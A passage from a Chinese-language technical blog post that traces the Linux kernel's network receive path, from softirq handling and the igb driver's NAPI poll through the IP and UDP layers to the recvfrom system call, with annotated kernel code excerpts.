class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">asmlinkage <span class="hljs-type">void</span> __do_softirq(<span class="hljs-type">void</span>)<br>&#123;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (pending &amp; <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> vec_nr = h - softirq_vec;<br>            <span class="hljs-type">int</span> prev_count = preempt_count();<br><br>            ...<br>            trace_softirq_entry(vec_nr);<br>            h-&gt;action(h);<br>            trace_softirq_exit(vec_nr);<br>            ...<br>        &#125;<br>        h++;<br>        pending &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">while</span> (pending);<br>&#125;<br></code></pre></td></tr></table></figure><p>在网络子系统初始化小节， 我们看到我们为NET_RX_SOFTIRQ注册了处理函数net_rx_action。所以<code>net_rx_action</code>函数就会被执行到了。</p><p>这里需要注意一个细节，硬中断中设置软中断标记，和ksoftirq的判断是否有软中断到达，都是基于smp_processor_id()的。这意味着只要硬中断在哪个CPU上被响应，那么软中断也是在这个CPU上处理的。所以说，如果你发现你的Linux软中断CPU消耗都集中在一个核上的话，做法是要把调整硬中断的CPU亲和性，来将硬中断打散到不通的CPU核上去。</p><p>我们再来把精力集中到这个核心函数<code>net_rx_action</code>上来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">net_rx_action</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> softirq_action *h)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">softnet_data</span> *<span class="hljs-title">sd</span> =</span> &amp;__get_cpu_var(softnet_data);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> time_limit = jiffies + <span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span> budget = netdev_budget;<br>    <span class="hljs-type">void</span> *have;<br><br>    local_irq_disable();<br><br>    <span class="hljs-keyword">while</span> (!list_empty(&amp;sd-&gt;poll_list)) &#123;<br>        ......<br>        n = list_first_entry(&amp;sd-&gt;poll_list, <span class="hljs-keyword">struct</span> napi_struct, poll_list);<br><br>        work = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (test_bit(NAPI_STATE_SCHED, &amp;n-&gt;state)) &#123;<br>            work = n-&gt;poll(n, weight);<br>            trace_napi_poll(n);<br>        &#125;<br><br>        budget -= work;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>函数开头的time_limit和budget是用来控制net_rx_action函数主动退出的，目的是保证网络包的接收不霸占CPU不放。 等下次网卡再有硬中断过来的时候再处理剩下的接收数据包。其中budget可以通过内核参数调整。 这个函数中剩下的核心逻辑是获取到当前CPU变量softnet_data，对其poll_list进行遍历, 然后执行到网卡驱动注册到的poll函数。对于igb网卡来说，就是igb驱动力的<code>igb_poll</code>函数了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  igb_poll - NAPI Rx polling callback</span><br><span class="hljs-comment"> *  @napi: napi polling structure</span><br><span class="hljs-comment"> *  @budget: count of how many packets we should handle</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">igb_poll</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> napi_struct *napi, <span class="hljs-type">int</span> budget)</span><br>&#123;<br>    ...<br>    <span class="hljs-keyword">if</span> (q_vector-&gt;tx.ring)<br>        clean_complete = igb_clean_tx_irq(q_vector);<br><br>    <span class="hljs-keyword">if</span> (q_vector-&gt;rx.ring)<br>        clean_complete &amp;= igb_clean_rx_irq(q_vector, budget);<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>在读取操作中，<code>igb_poll</code>的重点工作是对<code>igb_clean_rx_irq</code>的调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">igb_clean_rx_irq</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> igb_q_vector *q_vector, <span class="hljs-type">const</span> <span class="hljs-type">int</span> budget)</span><br>&#123;<br>    ...<br><br>    <span class="hljs-keyword">do</span> &#123;<br><br>        <span class="hljs-comment">/* retrieve a buffer from the ring */</span><br>        skb = igb_fetch_rx_buffer(rx_ring, rx_desc, skb);<br><br>        <span class="hljs-comment">/* fetch next buffer in frame if non-eop */</span><br>        <span class="hljs-keyword">if</span> (igb_is_non_eop(rx_ring, rx_desc))<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-comment">/* verify the packet layout is correct */</span><br>        <span class="hljs-keyword">if</span> (igb_cleanup_headers(rx_ring, rx_desc, skb)) &#123;<br>            skb = <span class="hljs-literal">NULL</span>;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-comment">/* populate checksum, timestamp, VLAN, and protocol */</span><br>        igb_process_skb_fields(rx_ring, rx_desc, skb);<br><br>        napi_gro_receive(&amp;q_vector-&gt;napi, skb);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>igb_fetch_rx_buffer</code>和<code>igb_is_non_eop</code>的作用就是把数据帧从RingBuffer上取下来。为什么需要两个函数呢？因为有可能帧要占多多个RingBuffer，所以是在一个循环中获取的，直到帧尾部。获取下来的一个数据帧用一个sk_buff来表示。收取完数据以后，对其进行一些校验，然后开始设置sbk变量的timestamp, VLAN id, protocol等字段。接下来进入到napi_gro_receive中:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/core/dev.c</span><br><span class="hljs-type">gro_result_t</span> <span class="hljs-title function_">napi_gro_receive</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> napi_struct *napi, <span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br>    skb_gro_reset_offset(skb);<br><br>    <span class="hljs-keyword">return</span> napi_skb_finish(dev_gro_receive(napi, skb), skb);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>dev_gro_receive</code>这个函数代表的是网卡GRO特性，可以简单理解成把相关的小包合并成一个大包就行，目的是减少传送给网络栈的包数，这有助于减少 CPU 的使用量。我们暂且忽略，直接看<code>napi_skb_finish</code>, 这个函数主要就是调用了<code>netif_receive_skb</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/core/dev.c</span><br><span class="hljs-type">static</span> <span class="hljs-type">gro_result_t</span> <span class="hljs-title function_">napi_skb_finish</span><span class="hljs-params">(<span class="hljs-type">gro_result_t</span> ret, <span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br>    <span class="hljs-keyword">switch</span> (ret) &#123;<br>    <span class="hljs-keyword">case</span> GRO_NORMAL:<br>        <span class="hljs-keyword">if</span> (netif_receive_skb(skb))<br>            ret = GRO_DROP;<br>        <span class="hljs-keyword">break</span>;<br>    ......<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>netif_receive_skb</code>中，数据包将被送到协议栈中。声明，以下的3.3, 3.4, 3.5也都属于软中断的处理过程，只不过由于篇幅太长，单独拿出来成小节。</p><h2 id="3-3-网络协议栈处理"><a href="#3-3-网络协议栈处理" class="headerlink" title="3.3 网络协议栈处理"></a>3.3 网络协议栈处理</h2><p><code>netif_receive_skb</code>函数会根据包的协议，假如是udp包，会将包依次送到ip_rcv(),udp_rcv()协议处理函数中进行处理。</p><p><img src="https://pic4.zhimg.com/80/v2-f715adfde90d4c5a50d19d739805010f_1440w.webp" alt="img"></p><p>​                                                                                                       <strong>图10 网络协议栈处理</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/core/dev.c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">netif_receive_skb</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br>    <span class="hljs-comment">//RPS处理逻辑，先忽略</span><br>    ......<br><br>    <span class="hljs-keyword">return</span> __netif_receive_skb(skb);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __netif_receive_skb(<span class="hljs-keyword">struct</span> sk_buff *skb)<br>&#123;<br>    ......   <br>    ret = __netif_receive_skb_core(skb, <span class="hljs-literal">false</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __netif_receive_skb_core(<span class="hljs-keyword">struct</span> sk_buff *skb, <span class="hljs-type">bool</span> pfmemalloc)<br>&#123;<br>    ......<br><br>    <span class="hljs-comment">//pcap逻辑，这里会将数据送入抓包点。tcpdump就是从这个入口获取包的</span><br>    list_for_each_entry_rcu(ptype, &amp;ptype_all, <span class="hljs-built_in">list</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!ptype-&gt;dev || ptype-&gt;dev == skb-&gt;dev) &#123;<br>            <span class="hljs-keyword">if</span> (pt_prev)<br>                ret = deliver_skb(skb, pt_prev, orig_dev);<br>            pt_prev = ptype;<br>        &#125;<br>    &#125;<br><br>    ......<br><br>    list_for_each_entry_rcu(ptype,<br>            &amp;ptype_base[ntohs(type) &amp; PTYPE_HASH_MASK], <span class="hljs-built_in">list</span>) &#123;<br>        <span class="hljs-keyword">if</span> (ptype-&gt;type == type &amp;&amp;<br>            (ptype-&gt;dev == null_or_dev || ptype-&gt;dev == skb-&gt;dev ||<br>             ptype-&gt;dev == orig_dev)) &#123;<br>            <span class="hljs-keyword">if</span> (pt_prev)<br>                ret = deliver_skb(skb, pt_prev, orig_dev);<br>            pt_prev = ptype;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>__netif_receive_skb_core</code>中，我看着原来经常使用的tcpdump的抓包点，很是激动，看来读一遍源代码时间真的没白浪费。接着<code>__netif_receive_skb_core</code>取出protocol，它会从数据包中取出协议信息，然后遍历注册在这个协议上的回调函数列表。<code>ptype_base</code> 是一个 hash table，在协议注册小节我们提到过。ip_rcv 函数地址就是存在这个 hash table中的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/core/dev.c</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">deliver_skb</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb,</span><br><span class="hljs-params">                  <span class="hljs-keyword">struct</span> packet_type *pt_prev,</span><br><span class="hljs-params">                  <span class="hljs-keyword">struct</span> net_device *orig_dev)</span><br>&#123;<br>    ......<br>    <span class="hljs-keyword">return</span> pt_prev-&gt;func(skb, skb-&gt;dev, pt_prev, orig_dev);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>pt_prev-&gt;func</code>这一行就调用到了协议层注册的处理函数了。对于ip包来讲，就会进入到<code>ip_rcv</code>（如果是arp包的话，会进入到arp_rcv）。</p><h2 id="3-4-IP协议层处理"><a href="#3-4-IP协议层处理" class="headerlink" title="3.4 IP协议层处理"></a>3.4 IP协议层处理</h2><p>我们再来大致看一下linux在ip协议层都做了什么，包又是怎么样进一步被送到udp或tcp协议处理函数中的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/ipv4/ip_input.c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ip_rcv</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb, <span class="hljs-keyword">struct</span> net_device *dev, <span class="hljs-keyword">struct</span> packet_type *pt, <span class="hljs-keyword">struct</span> net_device *orig_dev)</span><br>&#123;<br>    ......<br><br>    <span class="hljs-keyword">return</span> NF_HOOK(NFPROTO_IPV4, NF_INET_PRE_ROUTING, skb, dev, <span class="hljs-literal">NULL</span>,<br>               ip_rcv_finish);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里<code>NF_HOOK</code>是一个钩子函数，当执行完注册的钩子后就会执行到最后一个参数指向的函数<code>ip_rcv_finish</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ip_rcv_finish</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br>    ......<br><br>    <span class="hljs-keyword">if</span> (!skb_dst(skb)) &#123;<br>        <span class="hljs-type">int</span> err = ip_route_input_noref(skb, iph-&gt;daddr, iph-&gt;saddr,<br>                           iph-&gt;tos, skb-&gt;dev);<br>        ...<br>    &#125;<br><br>    ......<br><br>    <span class="hljs-keyword">return</span> dst_input(skb);<br>&#125;<br></code></pre></td></tr></table></figure><p>跟踪<code>ip_route_input_noref</code> 后看到它又调用了 <code>ip_route_input_mc</code>。 在<code>ip_route_input_mc</code>中，函数<code>ip_local_deliver</code>被赋值给了<code>dst.input</code>, 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/ipv4/route.c</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ip_route_input_mc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb, __be32 daddr, __be32 saddr,</span><br><span class="hljs-params">                u8 tos, <span class="hljs-keyword">struct</span> net_device *dev, <span class="hljs-type">int</span> our)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (our) &#123;<br>        rth-&gt;dst.input= ip_local_deliver;<br>        rth-&gt;rt_flags |= RTCF_LOCAL;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以回到<code>ip_rcv_finish</code>中的<code>return dst_input(skb);</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Input packet from network to transport.  */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">dst_input</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> skb_dst(skb)-&gt;input(skb);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>skb_dst(skb)-&gt;input</code>调用的input方法就是路由子系统赋的ip_local_deliver。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/ipv4/ip_input.c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ip_local_deliver</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     *  Reassemble IP fragments.</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-keyword">if</span> (ip_is_fragment(ip_hdr(skb))) &#123;<br>        <span class="hljs-keyword">if</span> (ip_defrag(skb, IP_DEFRAG_LOCAL_DELIVER))<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> NF_HOOK(NFPROTO_IPV4, NF_INET_LOCAL_IN, skb, skb-&gt;dev, <span class="hljs-literal">NULL</span>,<br>               ip_local_deliver_finish);<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ip_local_deliver_finish</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br>    ......<br><br>    <span class="hljs-type">int</span> protocol = ip_hdr(skb)-&gt;protocol;<br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_protocol</span> *<span class="hljs-title">ipprot</span>;</span><br><br>    ipprot = rcu_dereference(inet_protos[protocol]);<br>    <span class="hljs-keyword">if</span> (ipprot != <span class="hljs-literal">NULL</span>) &#123;<br>        ret = ipprot-&gt;handler(skb);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如协议注册小节看到inet_protos中保存着tcp_rcv()和udp_rcv()的函数地址。这里将会根据包中的协议类型选择进行分发,在这里skb包将会进一步被派送到更上层的协议中，udp和tcp。</p><h2 id="3-5-UDP协议层处理"><a href="#3-5-UDP协议层处理" class="headerlink" title="3.5 UDP协议层处理"></a>3.5 UDP协议层处理</h2><p>在协议注册小节的时候我们说过，udp协议的处理函数是<code>udp_rcv</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/ipv4/udp.c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">udp_rcv</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> __udp4_lib_rcv(skb, &amp;udp_table, IPPROTO_UDP);<br>&#125;<br><br><br><span class="hljs-type">int</span> __udp4_lib_rcv(<span class="hljs-keyword">struct</span> sk_buff *skb, <span class="hljs-keyword">struct</span> udp_table *udptable,<br>           <span class="hljs-type">int</span> proto)<br>&#123;<br>    sk = __udp4_lib_lookup_skb(skb, uh-&gt;source, uh-&gt;dest, udptable);<br><br>    <span class="hljs-keyword">if</span> (sk != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-type">int</span> ret = udp_queue_rcv_skb(sk, skb<br>    &#125;<br><br>    icmp_send(skb, ICMP_DEST_UNREACH, ICMP_PORT_UNREACH, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>__udp4_lib_lookup_skb</code>是根据skb来寻找对应的socket，当找到以后将数据包放到socket的缓存队列里。如果没有找到，则发送一个目标不可达的icmp包。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/ipv4/udp.c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">udp_queue_rcv_skb</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;   <br>    ......<br><br>    <span class="hljs-keyword">if</span> (sk_rcvqueues_full(sk, skb, sk-&gt;sk_rcvbuf))<br>        <span class="hljs-keyword">goto</span> drop;<br><br>        rc = <span class="hljs-number">0</span>;<br><br>    ipv4_pktinfo_prepare(skb);<br>    bh_lock_sock(sk);<br>    <span class="hljs-keyword">if</span> (!sock_owned_by_user(sk))<br>        rc = __udp_queue_rcv_skb(sk, skb);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sk_add_backlog(sk, skb, sk-&gt;sk_rcvbuf)) &#123;<br>        bh_unlock_sock(sk);<br>        <span class="hljs-keyword">goto</span> drop;<br>    &#125;<br>    bh_unlock_sock(sk);<br><br>    <span class="hljs-keyword">return</span> rc;<br>&#125;<br></code></pre></td></tr></table></figure><p>sock_owned_by_user判断的是用户是不是正在这个socker上进行系统调用（socket被占用），如果没有，那就可以直接放到socket的接收队列中。如果有，那就通过<code>sk_add_backlog</code>把数据包添加到backlog队列。 当用户释放的socket的时候，内核会检查backlog队列，如果有数据再移动到接收队列中。</p><p><code>sk_rcvqueues_full</code>接收队列如果满了的话，将直接把包丢弃。接收队列大小受内核参数net.core.rmem_max和net.core.rmem_default影响。</p><h2 id="四、recvfrom系统调用"><a href="#四、recvfrom系统调用" class="headerlink" title="四、recvfrom系统调用"></a>四、recvfrom系统调用</h2><p>花开两朵，各表一枝。 上面我们说完了整个Linux内核对数据包的接收和处理过程，最后把数据包放到socket的接收队列中了。那么我们再回头看用户进程调用<code>recvfrom</code>后是发生了什么。 我们在代码里调用的<code>recvfrom</code>是一个glibc的库函数，该函数在执行后会将用户进行陷入到内核态，进入到Linux实现的系统调用<code>sys_recvfrom</code>。在理解Linux对<code>sys_revvfrom</code>之前，我们先来简单看一下<code>socket</code>这个核心数据结构。这个数据结构太大了，我们只把对和我们今天主题相关的内容画出来，如下：</p><p><img src="https://pic3.zhimg.com/80/v2-3726d27ee32843df86d0555ec7971592_1440w.webp" alt="img"></p><p>​                                                                                                     <strong>图11 socket内核数据机构</strong></p><p><code>socket</code>数据结构中的<code>const struct proto_ops</code>对应的是协议的方法集合。每个协议都会实现不同的方法集，对于IPv4 Internet协议族来说,每种协议都有对应的处理方法，如下。对于udp来说，是通过<code>inet_dgram_ops</code>来定义的，其中注册了<code>inet_recvmsg</code>方法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/ipv4/af_inet.c</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proto_ops</span> <span class="hljs-title">inet_stream_ops</span> =</span> &#123;<br>    ......<br>    .recvmsg       = inet_recvmsg,<br>    .mmap          = sock_no_mmap,<br>    ......<br>&#125;<br><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> proto_ops inet_dgram_ops = &#123;<br>    ......<br>    .sendmsg       = inet_sendmsg,<br>    .recvmsg       = inet_recvmsg,<br>    ......<br>&#125;<br></code></pre></td></tr></table></figure><p><code>socket</code>数据结构中的另一个数据结构<code>struct sock *sk</code>是一个非常大，非常重要的子结构体。其中的<code>sk_prot</code>又定义了二级处理函数。对于UDP协议来说，会被设置成UDP协议实现的方法集<code>udp_prot</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/ipv4/udp.c</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proto</span> <span class="hljs-title">udp_prot</span> =</span> &#123;<br>    .name          = <span class="hljs-string">&quot;UDP&quot;</span>,<br>    .owner         = THIS_MODULE,<br>    .close         = udp_lib_close,<br>    .connect       = ip4_datagram_connect,<br>    ......<br>    .sendmsg       = udp_sendmsg,<br>    .recvmsg       = udp_recvmsg,<br>    .sendpage      = udp_sendpage,<br>    ......<br>&#125;<br></code></pre></td></tr></table></figure><p>看完了<code>socket</code>变量之后，我们再来看<code>sys_revvfrom</code>的实现过程。</p><p><img src="https://pic1.zhimg.com/80/v2-7a531f2411838cb2f5840b28662702a0_1440w.webp" alt="img"></p><p>​                                                                                               <strong>图12 recvfrom函数内部实现过程</strong></p><p>在<code>inet_recvmsg</code>调用了<code>sk-&gt;sk_prot-&gt;recvmsg</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: net/ipv4/af_inet.c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">inet_recvmsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> socket *sock, <span class="hljs-keyword">struct</span> msghdr *msg,</span><br><span class="hljs-params">         <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> flags)</span><br>&#123;   <br>    ......<br>    err = sk-&gt;sk_prot-&gt;recvmsg(iocb, sk, msg, size, flags &amp; MSG_DONTWAIT,<br>                   flags &amp; ~MSG_DONTWAIT, &amp;addr_len);<br>    <span class="hljs-keyword">if</span> (err &gt;= <span class="hljs-number">0</span>)<br>        msg-&gt;msg_namelen = addr_len;<br>    <span class="hljs-keyword">return</span> 